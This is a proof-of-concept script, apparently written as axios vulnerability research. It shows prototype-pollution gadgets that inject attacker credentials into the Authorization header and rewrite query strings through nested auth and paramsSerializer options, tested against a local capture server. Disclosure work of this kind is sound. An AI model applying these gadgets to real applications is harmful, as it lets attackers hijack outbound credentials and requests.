// PoC: Prototype-pollution gadgets via nested option objects (auth, paramsSerializer).
//
// Threat model:
//   1. Some other code in the same process pollutes Object.prototype (a separate
//      primitive — this PoC simulates that step directly).
//   2. The application then calls axios with partial nested config objects that
//      do NOT define their own `username` / `password` / `serialize` / `encode`
//      properties (e.g. `auth: {}` from a templated config, an empty default,
//      or partially-built options object).
//
// Expected fix-state behavior:
//   The application should not have its outbound `Authorization` header or
//   query string silently rewritten by attacker-controlled values inherited
//   through Object.prototype.
//
// Observed behavior on axios v1.16.1 (HEAD of v1.x):
//   - mergeConfig hardens the *top-level* config with a null-prototype object,
//     but nested plain objects are cloned via `utils.merge({}, source)`, which
//     yields an ordinary `{}` whose `[[Prototype]]` is the polluted
//     Object.prototype.
//   - lib/helpers/resolveConfig.js (browser/fetch) reads `auth.username` /
//     `auth.password` directly.
//   - lib/adapters/http.js reads `configAuth.username` / `configAuth.password`
//     directly (no own-property guard).
//   - lib/helpers/buildURL.js reads `options.encode` and `options.serialize`
//     through the prototype chain.
//
// Run:
//   node research/repros/pp_nested_option_gadgets.mjs

import http from 'node:http';
import axios from '../../index.js';

const ATTACKER_USER = 'attacker';
const ATTACKER_PASS = 'exfil';
const ATTACKER_BASIC = Buffer.from(`${ATTACKER_USER}:${ATTACKER_PASS}`).toString('base64');

// Step 1: simulate a pre-existing prototype-pollution primitive in this process.
// In reality, a separate dependency would have done this. We keep the
// "polluted" properties non-enumerable so they only affect inherited reads,
// which is the realistic shape of most prototype-pollution gadgets.
Object.defineProperty(Object.prototype, 'username', {
  value: ATTACKER_USER,
  configurable: true,
});
Object.defineProperty(Object.prototype, 'password', {
  value: ATTACKER_PASS,
  configurable: true,
});
Object.defineProperty(Object.prototype, 'serialize', {
  value: () => 'polluted=1',
  configurable: true,
});

// Local capture server.
const server = http.createServer((req, res) => {
  const captured = {
    authorization: req.headers['authorization'] || null,
    url: req.url,
  };
  res.writeHead(200, { 'content-type': 'application/json' });
  res.end(JSON.stringify(captured));
});

await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
const port = server.address().port;

try {
  // Application code: passes nested *placeholder* option objects that have
  // no own auth/serializer properties. Without prototype pollution this is
  // a no-op. With prototype pollution it becomes attacker-controlled state.
  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {
    auth: {},
    paramsSerializer: {},
    params: { unused: 'ignored-by-polluted-serializer' },
  });

  console.log('--- PoC: nested-option prototype-pollution gadgets ---');
  console.log('Server saw:', JSON.stringify(response.data));

  const authLeaked = response.data.authorization === `Basic ${ATTACKER_BASIC}`;
  const urlRewritten = response.data.url === '/demo?polluted=1';

  if (authLeaked && urlRewritten) {
    console.log(
      'VULNERABLE: nested auth + paramsSerializer inherited polluted ' +
        'Object.prototype values into the outbound request.'
    );
    process.exitCode = 0;
  } else {
    console.log('NOT VULNERABLE: nested option objects did not leak prototype state.');
    console.log('  authLeaked   =', authLeaked);
    console.log('  urlRewritten =', urlRewritten);
    process.exitCode = 1;
  }
} finally {
  server.close();
  // Restore Object.prototype so a noisy exit/process state cannot affect
  // anything else accidentally sharing the runtime.
  delete Object.prototype.username;
  delete Object.prototype.password;
  delete Object.prototype.serialize;
}
